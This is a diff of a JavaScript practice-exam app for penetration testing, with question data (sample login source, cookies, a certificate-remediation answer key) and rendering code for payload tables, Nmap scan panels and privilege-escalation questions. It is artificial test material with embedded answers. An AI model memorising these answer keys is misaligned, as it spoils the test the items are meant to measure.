value=\"\">", "\u003c!--input style=\"width:150px:\" type=\"text\" name=\"name\" id=\"name\" value=\"admin\"-->", "\u003c/div>", "\u003cdiv>\u003cspan style=\"width:100px;>Password: \u003c/span>\u003cinput style=\"width:150px;\" type=\"password\" name=\"Password\" id=\"password\" value=\"\">", "\u003c!--div>\u003cspan style=\"width:100px;>Password: \u003c/span>\u003cinput style=\"width:150px;\" type=\"password\" name=\"Password\" id=\"password\" value=\"password\"-->"],
+    cookies: [["ASP.NET_SessionId", "h1bcxktse2ewvqwf4bdcby3v", "www.com...", "/", "Session", "41"], ["__utma", "36104370.911013732.1508266963.1508266963.1508266963.1", ".company.o...", "/", "2019-10-1...", "59"], ["__utmb", "36104370.7.9.1508267988443", ".company.o...", "/", "2017-10-1...", "32"], ["__utmc", "36104370", ".company.o...", "/", "Session", "14"], ["__utmt", "1", ".company.o...", "/", "2017-10-1...", "7"], ["__utmv", "36104370.|2=Account%20Type=Not20Defined=1", ".company.o...", "/", "2019-10-1...", "48"], ["__utmz", "36104370.1508266963.1.1.utmcsr=google|utmccn=(organic)|utmc...", ".company.o...", "/", "2018-04-1...", "99"], ["_sp_id.0767", "4a84866c6ffff51c.1508266964.1.1508268019.1508266964.81ff34f7...", ".company.o...", "/", "2019-10-1...", "99"], ["_sp_id.0767", "*", ".company.o...", "/", "2017-10-1...", "13"]],
+    certOptions: ["Remove certificate from server", "Generate a Certificate Signing Request", "Submit CSR to the CA", "Install re-issued certificate on the server"],
+    certAnswer: ["Generate a Certificate Signing Request", "Submit CSR to the CA", "Install re-issued certificate on the server", "Remove certificate from server"],
+    explain: `
+      <h3>Highest vulnerability: the certificate</h3>
+      <ul>
+        <li>The certificate for <code>*.company.org</code> was valid from 7/18/2016 to <strong>7/19/2018</strong>, so it is treated as expired. Visitors can no longer trust the site's identity.</li>
+      </ul>
+      <h3>Remediation order</h3>
+      <ul>
+        <li>Generate a Certificate Signing Request, submit it to the CA, install the re-issued certificate, then remove the old certificate from the server.</li>
+        <li>Removing the old certificate last keeps one in place until its replacement is installed.</li>
+      </ul>
+      <h3>Also worth reporting</h3>
+      <ul>
+        <li>The source has commented-out login values and a script that writes the page address into the page. The cookies show no HttpOnly, Secure or SameSite settings.</li>
+        <li>The task asks you to remediate only the highest vulnerability, so changes to the source or cookies lose a point.</li>
+      </ul>`
   }
 ];
 
@@ -929,7 +1202,7 @@ let questions = [
    TYPE: table (Q1)
 ============================================================ */
 function bodyTable(q, st, stage) {
-  const sec = el("div", "section");
+  const sec = el("div", "section table-q");
   sectionHead(sec, q.caption, "Select the vulnerability type and remediation for each payload.");
   const wrap = el("div", "table-wrap");
   const table = el("table", "pbq");
@@ -950,13 +1223,16 @@ function bodyTable(q, st, stage) {
     const fb = el("div", "row-fb");
     td2.appendChild(fb);
 
+    td1.dataset.label = "Vulnerability Type"; td2.dataset.label = "Remediation";
     tr.append(td0, td1, td2); tbody.appendChild(tr);
   });
   table.appendChild(tbody); wrap.appendChild(table); sec.appendChild(wrap);
 
   const { row: actionsRow, pill } = buildActions(doSubmit, doShow, doReset);
+  actionsRow.querySelectorAll("button")[2].textContent = "Reset All";
   sec.appendChild(actionsRow);
-  const analysisHtml = "<ul>" + q.rows.map(r => `<li><strong>${r.payload.replace(/</g, "&lt;")}</strong> — ${r.vuln}, remediated with: ${r.remed}. ${r.why}</li>`).join("") + "</ul>";
+  const safe = t => t.replace(/&/g, "&amp;").replace(/</g, "&lt;");
+  const analysisHtml = "<ul>" + q.rows.map(r => `<li><strong><code>${safe(r.payload)}</code></strong><br>${r.vuln}. Remediation: ${safe(r.remed)}<br>${r.why}</li>`).join("") + "</ul>";
   const analysisBox = buildAnalysis(analysisHtml);
   sec.appendChild(analysisBox);
   stage.appendChild(sec);
@@ -1041,6 +1317,7 @@ function bodyMatch(q, st, stage) {
    TYPE: multi (Q3) — tabbed output + findings tied to each tab
 ============================================================ */
 function blockResult(b, ans) {
+  if (b.kind === "info") return { points: 0, total: 0 };
   if (b.kind === "radio") return { points: ans === b.answer ? 1 : 0, total: 1 };
   if (b.kind === "checks") {
     const sel = ans || [];
@@ -1052,109 +1329,87 @@ function blockResult(b, ans) {
 }
 
 function bodyMulti(q, st, stage) {
-  const sec = el("div", "section");
-  sectionHead(sec, q.title, "Review each output tab, then answer its findings below.");
+  const sec = el("div", "section enum-q");
+  sectionHead(sec, q.title, "Answer the questions on all three output tabs.");
 
-  const panel = el("div", "term-panel");
-  const tabs = el("div", "term-tabs");
+  const grid = el("div", "egrid");
+  const left = el("div");
+  const tabs = el("div", "etabs");
   q.outputs.forEach((o, i) => {
-    const b = el("button", "term-tab" + (i === st.tab ? " active" : ""), o.label); b.type = "button";
-    b.addEventListener("click", () => { st.tab = i; rerender(); });
+    const b = el("button", "etab", o.label); b.type = "button";
+    b.addEventListener("click", () => { st.tab = i; pre.scrollTop = 0; render(); });
     tabs.appendChild(b);
   });
-  panel.appendChild(tabs);
-  const body = el("div", "term-body");
-  const pre = el("pre", null, q.outputs[st.tab].text);
-  body.appendChild(pre);
-  panel.appendChild(body);
-  sec.appendChild(panel);
-
-  const findingsWrap = el("div");
-  sec.appendChild(findingsWrap);
+  const pre = el("pre", "eterm"); pre.tabIndex = 0;
+  left.append(tabs, pre);
+  const right = el("div");
+  grid.append(left, right);
+  sec.appendChild(grid);
 
   const { row: actionsRow, pill } = buildActions(doSubmit, doShow, doReset);
+  actionsRow.querySelectorAll("button")[2].textContent = "Reset All";
   sec.appendChild(actionsRow);
-  const analysisHtml = "<ul>" + q.blocks.map(b => `<li>${(b.why || (b.items ? b.items.map(it => it.why).join(" ") : ""))}</li>`).join("") + "</ul>";
-  const analysisBox = buildAnalysis(analysisHtml);
+  const analysisBox = buildAnalysis(q.explain);
   sec.appendChild(analysisBox);
   stage.appendChild(sec);
+  render();
 
-  function rerender() {
+  function render() {
     [...tabs.children].forEach((btn, i) => btn.classList.toggle("active", i === st.tab));
     pre.textContent = q.outputs[st.tab].text;
-    renderFindings();
-  }
-
-  function renderFindings() {
-    findingsWrap.innerHTML = "";
-    const grid = el("div", "answer-grid");
+    right.innerHTML = "";
     q.blocks.forEach((b, bi) => {
       if (b.output !== st.tab) return;
-      if (b.kind === "radio" || b.kind === "checks") {
-        const multi = b.kind === "checks";
-        const box = el("div", "qbox" + (multi ? " actions-box" : ""));
-        const lab = el("label"); lab.innerHTML = b.header; box.appendChild(lab);
-        if (b.context) { const c = el("div", "sub"); c.innerHTML = b.context; c.style.marginBottom = "10px"; box.appendChild(c); }
-        if (!multi) {
-          const sel = st.ans[bi];
-          b.options.forEach(opt => {
-            const lbl = el("label", "chk");
-            const inp = document.createElement("input"); inp.type = "radio"; inp.name = "b" + bi; inp.value = opt; inp.checked = sel === opt;
-            inp.addEventListener("change", () => { st.ans[bi] = opt; clearFeedback(); });
-            const span = el("span", null, opt);
-            const badge = el("span", "badge");
-            if (st.checked) { const ok = opt === b.answer; if (inp.checked) { badge.classList.add(ok ? "correct" : "incorrect"); badge.textContent = ok ? "Correct" : "Incorrect"; } }
-            lbl.append(inp, span, badge);
-            box.appendChild(lbl);
-          });
-        } else {
-          if (b.prompt) { const p = el("div"); p.innerHTML = b.prompt; p.style.marginBottom = "8px"; p.style.fontSize = "13px"; p.style.color = "var(--text-dim)"; box.appendChild(p); }
-          const list = el("div", "chk-list");
-          const sel = st.ans[bi] || [];
-          b.options.forEach(opt => {
-            const lbl = el("label", "chk");
-            const inp = document.createElement("input"); inp.type = "checkbox"; inp.value = opt; inp.checked = sel.includes(opt);
-            inp.addEventListener("change", () => { st.ans[bi] = [...list.querySelectorAll("input:checked")].map(x => x.value); clearFeedback(); });
-            const span = el("span", null, opt);
-            const badge = el("span", "badge");
-            if (st.checked && inp.checked) { const ok = b.answers.includes(opt); badge.classList.add(ok ? "correct" : "incorrect"); badge.textContent = ok ? "Correct" : "Incorrect"; }
-            lbl.append(inp, span, badge);
-            list.appendChild(lbl);
-          });
-          box.appendChild(list);
-        }
-        grid.appendChild(box);
-      } else {
-        const box = el("div", "qbox actions-box");
-        const lab = el("label"); lab.innerHTML = b.header; box.appendChild(lab);
+      const box = el("div", "ebox");
+      const head = el("div", "ehead"); head.innerHTML = b.header;
+      const body = el("div", "ebody");
+      box.append(head, body); right.appendChild(box);
+      if (b.kind === "info") { body.classList.add("einfo"); body.innerHTML = b.html; return; }
+      if (b.kind === "dropdowns") {
         b.items.forEach((it, ii) => {
-          const row = el("div"); row.style.marginBottom = "10px";
-          const l2 = el("label"); l2.style.fontWeight = "400"; l2.style.fontSize = "12.5px"; l2.textContent = it.prompt;
-          row.appendChild(l2);
+          const row = el("label", "edrop"); row.appendChild(el("span", null, it.prompt));
           const sel = makeSelect(it.options, (st.ans[bi] || [])[ii] || "", v => { st.ans[bi] = st.ans[bi] || []; st.ans[bi][ii] = v; clearFeedback(); }, it.prompt);
           if (st.checked) sel.classList.add(sel.value === it.answer ? "correct" : "wrong");
-          row.appendChild(sel);
-          box.appendChild(row);
+          row.appendChild(sel); body.appendChild(row);
         });
-        grid.appendChild(box);
+        return;
       }
+      const options = b.optionsBy ? (b.optionsBy[st.ans[b.dependsOn]] || []) : b.options;
+      if (!options.length) { body.appendChild(el("div", "ewait", "Choose a tool above to see its commands.")); return; }
+      const multi = b.kind === "checks";
+      const list = el("div", "chk-list");
+      options.forEach(opt => {
+        const lbl = el("label", "chk");
+        const inp = document.createElement("input"); inp.type = multi ? "checkbox" : "radio"; inp.name = "b" + bi; inp.value = opt;
+        inp.checked = multi ? (st.ans[bi] || []).includes(opt) : st.ans[bi] === opt;
+        inp.addEventListener("change", () => {
+          if (multi) st.ans[bi] = [...list.querySelectorAll("input:checked")].map(x => x.value);
+          else st.ans[bi] = opt;
+          q.blocks.forEach((d, di) => { if (d.dependsOn === bi) delete st.ans[di]; });
+          clearFeedback();
+        });
+        const span = el("span", "otext" + (b.mono ? " mono" : ""), opt);
+        const badge = el("span", "badge");
+        if (st.checked && inp.checked) { const ok = multi ? b.answers.includes(opt) : opt === b.answer; badge.classList.add(ok ? "correct" : "incorrect"); badge.textContent = ok ? "Correct" : "Incorrect"; }
+        lbl.append(inp, span, badge);
+        list.appendChild(lbl);
+      });
+      body.appendChild(list);
     });
-    findingsWrap.appendChild(grid);
   }
-  renderFindings();
 
   function clearFeedback() {
     st.checked = false;
     pill.classList.remove("show", "full", "partial");
     analysisBox.classList.remove("show");
-    renderFindings();
+    render();
   }
 
   function doSubmit() {
     let points = 0, total = 0;
     q.blocks.forEach((b, bi) => { const r = blockResult(b, st.ans[bi]); points += r.points; total += r.total; });
     st.checked = true;
-    renderFindings();
+    render();
     setPill(pill, points, total);
     analysisBox.classList.add("show");
   }
@@ -1163,7 +1418,7 @@ function bodyMulti(q, st, stage) {
     q.blocks.forEach((b, bi) => {
       if (b.kind === "radio") st.ans[bi] = b.answer;
       else if (b.kind === "checks") st.ans[bi] = b.answers.slice();
-      else st.ans[bi] = b.items.map(it => it.answer);
+      else if (b.kind === "dropdowns") st.ans[bi] = b.items.map(it => it.answer);
     });
     doSubmit();
   }
@@ -1174,42 +1429,38 @@ function bodyMulti(q, st, stage) {
 /* ============================================================
    TYPE: sim (Q4) — network diagram + Nmap + vuln/remediation tabs
 ============================================================ */
-const SIM_ICONS = {
-  fw: '<svg viewBox="0 0 64 48" width="60" height="44" aria-hidden="true"><rect x="2" y="2" width="60" height="44" fill="none" stroke="currentColor" stroke-width="3"/><path d="M2 17h60M2 32h60M22 2v15M42 2v15M12 17v15M32 17v15M52 17v15M22 32v14M42 32v14" fill="none" stroke="currentColor" stroke-width="3"/></svg>',
-  pc: '<svg viewBox="0 0 64 44" width="56" height="38" aria-hidden="true"><rect x="10" y="3" width="44" height="28" rx="3" fill="none" stroke="currentColor" stroke-width="3"/><path d="M3 40h58l-5-7H8z" fill="none" stroke="currentColor" stroke-width="3" stroke-linejoin="round"/></svg>',
-  srv: '<svg viewBox="0 0 40 52" width="38" height="50" aria-hidden="true"><rect x="3" y="2" width="34" height="48" rx="4" fill="none" stroke="currentColor" stroke-width="3"/><path d="M9 14h22M9 22h22" fill="none" stroke="currentColor" stroke-width="3"/><circle cx="20" cy="38" r="6" fill="none" stroke="currentColor" stroke-width="3"/></svg>'
-};
+const SIM_DIAGRAM = `<svg viewBox="0 0 530 420" role="group" aria-label="Network diagram: pentester workstation, CDN/WAF, app server and database server"><path fill="#b9dcf8" d="M262 140C262 118 282 106 300 111C300 78 333 54 366 63C386 36 436 42 446 82C458 62 492 62 497 88C514 82 530 96 530 112V140Z"/><text x="285" y="40" text-anchor="middle" font-size="17" font-weight="800" fill="#2fd6a6">PENTESTER WORKSTATION</text><path fill="#15171c" d="M20 27Q20 22 26 21L138 12Q144 12 146 17L178 130L56 146Z"/><path fill="#6ff3fb" d="M29 30L136 21L166 123L61 137Z"/><path fill="#b9fbff" opacity=".55" d="M29 30L84 25L61 137Z"/><path fill="#23262d" d="M56 146L178 130L272 141Q276 144 270 147L132 168Q124 169 118 165Z"/><path fill="#0b0c0f" d="M56 146L118 165Q124 169 132 168L270 147V153L134 176Q124 178 116 172L56 154Z"/><path fill="#4a505c" d="M92 148L180 136L226 142L132 156Z"/><path fill="#343943" d="M146 159L178 154L192 157L160 162Z"/><g fill="none" stroke="#2fd6a6" stroke-width="9" stroke-linejoin="round"><path d="M56 160H36V315H62"/><path d="M240 315H262"/><path d="M370 315H392"/></g><path fill="#2fd6a6" d="M58 301L77 315L58 329ZM258 301L278 315L258 329ZM388 301L408 315L388 329Z"/><text x="155" y="196" text-anchor="middle" font-size="18" font-weight="800" fill="#f7a400">CDN NETWORK</text><text x="394" y="196" text-anchor="middle" font-size="18" font-weight="800" fill="#0a86f0">PRODUCTION NETWORK</text><g class="hot" data-node="cdn" role="button" tabindex="0" aria-label="CDN/WAF: view Nmap scan"><rect class="hit" x="80" y="208" width="150" height="208" rx="10"/><text x="155" y="231" text-anchor="middle" font-size="16" font-weight="700" fill="#f7a400">CDN/WAF</text><g fill="#fff" stroke="#f7a400" stroke-width="4.5" stroke-linejoin="round"><rect x="82" y="244" width="146" height="142" rx="9"/><path fill="none" d="M82 272.5h146M82 301h146M82 329.5h146M82 358h146M130 244v28.5M180 244v28.5M106 272.5V301M156 272.5V301M204 272.5V301M130 301v28.5M180 301v28.5M106 329.5V358M156 329.5V358M204 329.5V358M130 358v28M180 358v28"/></g><text x="155" y="408" text-anchor="middle" font-size="13" font-weight="600" fill="#f7a400">CDN.example.com</text></g><g class="hot" data-node="app" role="button" tabindex="0" aria-label="App server: view Nmap scan"><rect class="hit" x="264" y="208" width="124" height="208" rx="10"/><text x="325" y="231" text-anchor="middle" font-size="16" font-weight="700" fill="#0a86f0">App server</text><rect x="292" y="246" width="66" height="140" rx="9" fill="#fff" stroke="#0a86f0" stroke-width="5"/><path d="M307 270h36M307 288h36M307 306h36" stroke="#0a86f0" stroke-width="6" stroke-linecap="round"/><circle cx="325" cy="353" r="15" fill="none" stroke="#0a86f0" stroke-width="5"/><text x="325" y="408" text-anchor="middle" font-size="13" font-weight="600" fill="#0a86f0">App01.example.com</text></g><g class="hot" data-node="db" role="button" tabindex="0" aria-label="DB server: view Nmap scan"><rect class="hit" x="394" y="208" width="132" height="208" rx="10"/><text x="460" y="231" text-anchor="middle" font-size="16" font-weight="700" fill="#0a86f0">DB server</text><rect x="427" y="246" width="66" height="140" rx="9" fill="#fff" stroke="#0a86f0" stroke-width="5"/><path d="M442 270h36M442 288h36M442 306h36" stroke="#0a86f0" stroke-width="6" stroke-linecap="round"/><circle cx="460" cy="353" r="15" fill="none" stroke="#0a86f0" stroke-width="5"/><text x="460" y="408" text-anchor="middle" font-size="13" font-weight="600" fill="#0a86f0">DBProd.example.com</text></g></svg>`;
 
 function bodySim(q, st, stage) {
-  const sec = el("div", "section");
-  sectionHead(sec, q.title, "Click the WAF and each server to review its Nmap scan, then answer below.");
+  const sec = el("div", "section sim-q");
+  sectionHead(sec, q.title, "Click the WAF and servers to review each Nmap scan, then answer on both tabs.");
 
   const grid = el("div", "simgrid");
   const left = el("div");
-  const net = el("div", "net");
-  const ws = el("div", "ws"); ws.innerHTML = SIM_ICONS.pc; ws.appendChild(el("span", null, q.sourceLabel || "PENTESTER WORKSTATION")); net.appendChild(ws);
-  net.appendChild(el("div", "down", "↓"));
-  const zones = el("div", "zones"); zones.style.gridTemplateColumns = "1fr";
-  const z2 = el("div", "zone prod"); z2.appendChild(el("h4", null, q.zoneLabel || "SCANNED HOSTS"));
-  const nodes = el("div", "nodes"); nodes.style.flexWrap = "wrap";
-  Object.keys(q.nodes).forEach((k, i) => { if (i) nodes.append(el("span", "arrow", "·")); nodes.append(simNode(q, st, k)); });
-  z2.appendChild(nodes); zones.append(z2);
-  net.appendChild(zones);
-  net.appendChild(el("div", "hint", "Click the WAF and each server to review its Nmap scan."));
-  left.appendChild(net);
-
+  const dgm = el("div", "dgm"); dgm.innerHTML = SIM_DIAGRAM; left.appendChild(dgm);
+  left.appendChild(el("div", "hint", "Click the CDN/WAF, App server or DB server to view its scan."));
   const nmapWrap = el("div");
   left.appendChild(nmapWrap);
+  const hots = [...dgm.querySelectorAll("[data-node]")];
+  hots.forEach(g => {
+    const toggle = () => {
+      st.open = st.open === g.dataset.node ? null : g.dataset.node;
+      renderNmap();
+      if (nmapWrap.firstChild) nmapWrap.firstChild.scrollIntoView({ block: "nearest", behavior: "smooth" });
+    };
+    g.addEventListener("click", toggle);
+    g.addEventListener("keydown", e => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); toggle(); } });
+  });
   renderNmap();
 
   const right = el("div", "simright");
-  const tabs = el("div", "term-tabs");
+  const tabs = el("div", "simtabs");
   [["vuln", "Vulnerability"], ["rem", "Remediation"]].forEach(([id, label]) => {
-    const b = el("button", "term-tab" + (st.tab === id ? " active" : ""), label); b.type = "button";
-    b.addEventListener("click", () => { st.tab = id; rerenderTab(); });
+    const b = el("button", "simtab", label); b.type = "button"; b.dataset.tab = id;
+    b.addEventListener("click", () => { st.tab = id; renderQbox(); });
     tabs.appendChild(b);
   });
-  const qboxWrap = el("div"); qboxWrap.style.background = "var(--panel)"; qboxWrap.style.border = "1px solid var(--border)"; qboxWrap.style.borderTop = "0"; qboxWrap.style.borderRadius = "0 0 12px 12px"; qboxWrap.style.padding = "16px";
+  const qboxWrap = el("div", "simpanel");
   right.append(tabs, qboxWrap);
   renderQbox();
 
@@ -1217,6 +1468,7 @@ function bodySim(q, st, stage) {
   sec.appendChild(grid);
 
   const { row: actionsRow, pill } = buildActions(doSubmit, doShow, doReset);
+  actionsRow.querySelectorAll("button")[2].textContent = "Reset All";
   sec.appendChild(actionsRow);
   const analysisBox = buildAnalysis(q.explain);
   sec.appendChild(analysisBox);
@@ -1224,28 +1476,24 @@ function bodySim(q, st, stage) {
 
   function renderNmap() {
     nmapWrap.innerHTML = "";
+    hots.forEach(g => g.classList.toggle("active", g.dataset.node === st.open));
     if (!st.open) return;
     const n = q.nodes[st.open];
     const box = el("div", "nmap");
     const h = el("div", "nh2"); h.appendChild(el("span", null, n.title));
-    const x = el("button", null, "✕"); x.type = "button";
+    const x = el("button", null, "✕"); x.type = "button"; x.setAttribute("aria-label", "Close scan");
     x.addEventListener("click", () => { st.open = null; renderNmap(); });
     h.appendChild(x);
-    const pre = el("pre", null, n.text);
-    box.append(h, pre); nmapWrap.appendChild(box);
-  }
-
-  function rerenderTab() {
-    [...tabs.children].forEach((b, i) => b.classList.toggle("active", (i === 0 ? "vuln" : "rem") === st.tab));
-    renderQbox();
+    box.append(h, el("pre", null, n.text)); nmapWrap.appendChild(box);
   }
 
   function renderQbox() {
+    [...tabs.children].forEach(b => b.classList.toggle("active", b.dataset.tab === st.tab));
     qboxWrap.innerHTML = "";
     const spec = q[st.tab];
     const multi = st.tab === "rem";
-    const h3 = el("div"); h3.style.fontFamily = "'Space Grotesk',sans-serif"; h3.style.fontWeight = "600"; h3.style.fontSize = "13.5px"; h3.style.marginBottom = "10px"; h3.innerHTML = spec.prompt;
-    qboxWrap.appendChild(h3);
+    const head = el("div", "simprompt"); head.innerHTML = spec.prompt;
+    qboxWrap.appendChild(head);
     const list = el("div", "chk-list");
     spec.options.forEach(opt => {
       const lbl = el("label", "chk");
@@ -1286,36 +1534,27 @@ function bodySim(q, st, stage) {
   function doReset() { states[current] = freshState(q); renderQuestion(); }
 }
 
-function simNode(q, st, key) {
-  const n = q.nodes[key];
-  const b = el("button", "node" + (st.open === key ? " active" : "")); b.type = "button"; b.dataset.node = key;
-  const ico = el("span", "ico"); ico.innerHTML = SIM_ICONS[n.icon]; b.appendChild(ico);
-  b.appendChild(el("span", "nn", n.name)); b.appendChild(el("span", "nh", n.host));
-  b.addEventListener("click", () => { st.open = st.open === key ? null : key; renderQuestion(); });
-  return b;
-}
-
 /* ============================================================
    TYPE: hotspot (Q5) — robots.txt + tool selection
 ============================================================ */
 function bodyHotspot(q, st, stage) {
-  const sec = el("div", "section");
-  sectionHead(sec, q.title, "Select the entries to remove and the tool to use next.");
+  const sec = el("div", "section hot-q");
+  sectionHead(sec, q.title, "Select three entries to remove and one tool.");
 
   const grid = el("div", "simgrid");
   const left = el("div", "hotpanel");
   const bar = el("div", "urlbar");
-  bar.appendChild(el("span", "nav-dots", "‹ › ↻")); bar.appendChild(el("div", "url", q.url)); left.appendChild(bar);
+  bar.appendChild(el("span", "nav-dots", "← → ↻")); bar.appendChild(el("div", "url", q.url)); bar.appendChild(el("span", "nav-dots", "⋮")); left.appendChild(bar);
   const pr = el("div", "hotprompt"); pr.appendChild(el("span", null, q.listPrompt));
   const cnt = el("span", "cnt"); pr.appendChild(cnt); left.appendChild(pr);
   const list = el("div", "robots"); left.appendChild(list);
 
   const right = el("div");
-  const rsec = el("div"); rsec.style.background = "var(--panel)"; rsec.style.border = "1px solid var(--border)"; rsec.style.borderRadius = "12px"; rsec.style.padding = "16px 18px";
-  const rh = el("div"); rh.style.fontFamily = "'Space Grotesk',sans-serif"; rh.style.fontWeight = "600"; rh.style.fontSize = "13.5px"; rh.style.marginBottom = "4px"; rh.textContent = q.tool.header;
-  const rp = el("div"); rp.style.fontSize = "12.5px"; rp.style.color = "var(--text-dim)"; rp.style.marginBottom = "10px"; rp.textContent = q.tool.prompt;
+  const rsec = el("div", "toolcard");
+  const toolBody = el("div", "toolbody");
   const toolList = el("div", "chk-list");
-  rsec.append(rh, rp, toolList);
+  toolBody.append(el("div", "toolprompt", q.tool.prompt), toolList);
+  rsec.append(el("div", "toolhead", q.tool.header), toolBody);
   right.appendChild(rsec);
   grid.append(left, right);
   sec.appendChild(grid);
@@ -1387,100 +1626,82 @@ function bodyHotspot(q, st, stage) {
    TYPE: recon2 (Q6) — Part 1 / Part 2 tabs
 ============================================================ */
 function bodyRecon(q, st, stage) {
-  const sec = el("div", "section");
+  const sec = el("div", "section recon-q");
   sectionHead(sec, q.title, "Work through Part 1, then Part 2.");
 
-  const tabs = el("div", "term-tabs");
+  const tabs = el("div", "rtabs");
   ["Part 1", "Part 2"].forEach((label, i) => {
-    const b = el("button", "term-tab" + (st.tab === i ? " active" : ""), label); b.type = "button";
-    b.addEventListener("click", () => { st.tab = i; rerender(); });
+    const b = el("button", "rtab", label); b.type = "button";
+    b.addEventListener("click", () => { st.tab = i; renderPart(); });
     tabs.appendChild(b);
   });
   sec.appendChild(tabs);
 
-  const partWrap = el("div"); partWrap.style.border = "1px solid var(--border)"; partWrap.style.borderTop = "0";
-  partWrap.style.borderRadius = "0 0 12px 12px"; partWrap.style.background = "var(--panel)"; partWrap.style.padding = "16px"; partWrap.style.marginBottom = "4px";
+  const partWrap = el("div");
   sec.appendChild(partWrap);
-  renderPart();
 
   const { row: actionsRow, pill } = buildActions(doSubmit, doShow, doReset);
+  actionsRow.querySelectorAll("button")[2].textContent = "Reset All";
   sec.appendChild(actionsRow);
-  const analysisHtml = `<p><strong>Part 1:</strong> ${q.part1.why}</p><p><strong>Escalation:</strong> ${q.part2.escWhy}</p><p><strong>Remediation:</strong> ${q.part2.remWhy}</p>`;
-  const analysisBox = buildAnalysis(analysisHtml);
+  const analysisBox = buildAnalysis(q.explain);
   sec.appendChild(analysisBox);
   stage.appendChild(sec);
+  renderPart();
 
-  function rerender() {
-    [...tabs.children].forEach((b, i) => b.classList.toggle("active", i === st.tab));
-    renderPart();
+  function panel(title) {
+    const p = el("div", "rpanel"); p.appendChild(el("div", "rhead", title)); return p;
+  }
+  function choiceBox(prompt, options, multi, name, isChecked, isRight, onPick, fill) {
+    const box = el("div", "rbox");
+    const head = el("div", "rprompt"); head.innerHTML = prompt; box.appendChild(head);
+    const list = el("div", "chk-list");
+    options.forEach(opt => {
+      const lbl = el("label", "chk");
+      const inp = document.createElement("input"); inp.type = multi ? "checkbox" : "radio"; inp.name = name; inp.value = opt; inp.checked = isChecked(opt);
+      inp.addEventListener("change", () => { onPick(opt, list); clearFeedback(); });
+      const span = el("span", "otext"); fill(span, opt);
+      const badge = el("span", "badge");
+      if (st.checked && inp.checked) { const ok = isRight(opt); badge.classList.add(ok ? "correct" : "incorrect"); badge.textContent = ok ? "Correct" : "Incorrect"; }
+      lbl.append(inp, span, badge);
+      list.appendChild(lbl);
+    });
+    box.appendChild(list);
+    return box;
   }
 
   function renderPart() {
+    [...tabs.children].forEach((b, i) => b.classList.toggle("active", i === st.tab));
     partWrap.innerHTML = "";
+    const mono = (span, opt) => { span.classList.add("mono"); span.textContent = opt; };
     if (st.tab === 0) {
-      const panel = el("div", "term-panel"); panel.style.marginBottom = "18px";
-      const rh = el("div"); rh.style.background = "#0d6efd"; rh.style.color = "#fff"; rh.style.padding = "10px 16px"; rh.style.fontWeight = "650"; rh.style.fontSize = ".9rem"; rh.textContent = q.part1.label;
-      const body = el("div", "term-body"); body.appendChild(el("pre", null, q.part1.terminal));
-      panel.append(rh, body); partWrap.appendChild(panel);
-
-      const box = el("div"); box.style.marginTop = "12px";
-      const h3 = el("div"); h3.style.fontFamily = "'Space Grotesk',sans-serif"; h3.style.fontWeight = "600"; h3.style.fontSize = "13.5px"; h3.style.marginBottom = "10px"; h3.innerHTML = q.part1.prompt;
-      box.appendChild(h3);
-      const list = el("div", "chk-list");
-      q.part1.options.forEach(opt => {
-        const lbl = el("label", "chk"); lbl.style.fontFamily = "'IBM Plex Mono',monospace"; lbl.style.fontSize = "12px";
-        const inp = document.createElement("input"); inp.type = "radio"; inp.name = "p1"; inp.value = opt; inp.checked = st.p1 === opt;
-        inp.addEventListener("change", () => { st.p1 = opt; clearFeedback(); });
-        const span = el("span", null, opt);
-        const badge = el("span", "badge");
-        if (st.checked && inp.checked) { const ok = opt === q.part1.answer; badge.classList.add(ok ? "correct" : "incorrect"); badge.textContent = ok ? "Correct" : "Incorrect"; }
-        lbl.append(inp, span, badge);
-        list.appendChild(lbl);
-      });
-      box.appendChild(list);
-      partWrap.appendChild(box);
-    } else {
-      const panel = el("div", "term-panel"); panel.style.marginBottom = "18px";
-      const rh = el("div"); rh.style.background = "#0d6efd"; rh.style.color = "#fff"; rh.style.padding = "10px 16px"; rh.style.fontWeight = "650"; rh.style.fontSize = ".9rem"; rh.textContent = q.part2.label;
-      const list = el("ul", "cmdlist");
-      q.part2.commands.forEach(c => list.appendChild(el("li", null, "> " + c)));
-      const note = el("div", "cmdnote", q.part2.cmdNote);
-      panel.append(rh, list, note); partWrap.appendChild(panel);
-
-      const grid = el("div", "answer-grid");
-
-      const box1 = el("div", "qbox actions-box");
-      const h1 = el("label"); h1.innerHTML = q.part2.escPrompt; box1.appendChild(h1);
-      const list1 = el("div", "chk-list");
-      q.part2.escOptions.forEach(opt => {
-        const lbl = el("label", "chk"); lbl.style.fontFamily = "'IBM Plex Mono',monospace"; lbl.style.fontSize = "11.5px"; lbl.style.whiteSpace = "pre-wrap"; lbl.style.alignItems = "flex-start";
-        const inp = document.createElement("input"); inp.type = "radio"; inp.name = "esc"; inp.value = opt; inp.checked = st.esc === opt; inp.style.marginTop = "3px";
-        inp.addEventListener("change", () => { st.esc = opt; clearFeedback(); });
-        const span = el("span", null, opt);
-        const badge = el("span", "badge"); badge.style.marginLeft = "0"; badge.style.flex = "none";
-        if (st.checked && inp.checked) { const ok = opt === q.part2.escAnswer; badge.classList.add(ok ? "correct" : "incorrect"); badge.textContent = ok ? "Correct" : "Incorrect"; }
-        lbl.append(inp, span, badge);
-        list1.appendChild(lbl);
-      });
-      box1.appendChild(list1); grid.appendChild(box1);
-
-      const box2 = el("div", "qbox actions-box");
-      const h2 = el("label"); h2.innerHTML = q.part2.remPrompt; box2.appendChild(h2);
-      const list2 = el("div", "chk-list");
-      q.part2.remOptions.forEach(opt => {
-        const lbl = el("label", "chk");
-        const inp = document.createElement("input"); inp.type = "checkbox"; inp.name = "rem"; inp.value = opt; inp.checked = st.rem.includes(opt);
-        inp.addEventListener("change", () => { st.rem = [...list2.querySelectorAll("input:checked")].map(x => x.value); clearFeedback(); });
-        const span = el("span", null, opt);
-        const badge = el("span", "badge");
-        if (st.checked && inp.checked) { const ok = q.part2.remAnswers.includes(opt); badge.classList.add(ok ? "correct" : "incorrect"); badge.textContent = ok ? "Correct" : "Incorrect"; }
-        lbl.append(inp, span, badge);
-        list2.appendChild(lbl);
-      });
-      box2.appendChild(list2); grid.appendChild(box2);
-
-      partWrap.appendChild(grid);
+      const p = panel(q.part1.label);
+      p.appendChild(el("pre", "rterm", q.part1.terminal));
+      partWrap.appendChild(p);
+      partWrap.appendChild(choiceBox(q.part1.prompt, q.part1.options, false, "p1",
+        o => st.p1 === o, o => o === q.part1.answer, o => { st.p1 = o; }, mono));
+      return;
     }
+    const p = panel(q.part2.label);
+    const cmds = el("div", "rcmds");
